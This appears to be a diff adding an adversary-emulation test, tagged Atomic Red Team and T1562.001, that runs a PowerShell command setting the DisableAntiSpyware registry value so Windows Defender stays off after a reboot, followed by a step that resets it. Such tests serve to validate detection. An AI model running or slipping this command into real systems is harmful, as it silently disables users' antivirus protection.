@@ -1,0 +1,44 @@
+{
+  "id": "1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45",
+  "name": "Tamper with Windows Defender Registry",
+  "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "2dab4d6d-e7ca-4bbd-aa81-47e1f72a35da",
+      "type": "execute-command",
+      "data": {
+        "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "58dc3dae-48e8-45c1-972a-d06851798db6",
+      "type": "execute-command",
+      "data": {
+        "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "2dab4d6d-e7ca-4bbd-aa81-47e1f72a35da",
+      "p": "on-success",
+      "o": "58dc3dae-48e8-45c1-972a-d06851798db6"
+    },
+    {
+      "s": "2dab4d6d-e7ca-4bbd-aa81-47e1f72a35da",
+      "p": "on-failure",
+      "o": "58dc3dae-48e8-45c1-972a-d06851798db6"
+    }
+  ],
+  "tags": [
+    "T1562.001",
+    "atomic-red-team"
+  ]
+}
